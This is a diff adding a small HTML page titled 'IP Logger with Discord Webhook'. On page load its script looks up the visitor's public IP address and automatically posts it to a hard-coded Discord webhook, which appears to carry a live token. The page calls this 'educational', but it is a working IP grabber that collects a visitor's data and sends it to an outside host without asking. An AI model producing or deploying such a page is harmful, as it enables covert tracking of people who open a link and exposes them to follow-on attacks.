@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>IP Logger with Discord Webhook</title>
+  <script>
+    window.onload = function() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+
+          // Show IP on page
+          const p = document.createElement('p');
+          p.innerHTML = 'Your public IP address is: <strong>' + ip + '</strong>';
+          document.body.appendChild(p);
+
+          // Send IP to Discord webhook
+          fetch('https://discord.com/api/webhooks/1371115784205766816/8BenONajqNqFZNTNkOgx3lNInlJSxv9ML8Pz0jqcmjF60rzze8WzakoEampdxWSUKQBm', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: `Visitor IP: ${ip} (educational test)` })
+          })
+          .then(() => console.log('IP sent to Discord webhook'))
+          .catch(() => console.log('Failed to send IP to Discord webhook'));
+        })
+        .catch(() => {
+          const p = document.createElement('p');
+          p.textContent = 'Sorry, unable to fetch IP address.';
+          document.body.appendChild(p);
+        });
+    };
+  </script>
+</head>
+<body>
+  <h1>IP Logger with Discord Webhook</h1>
+  <p>This page will fetch your IP and send it to a Discord channel (educational purposes only).</p>
+</body>
+</html>
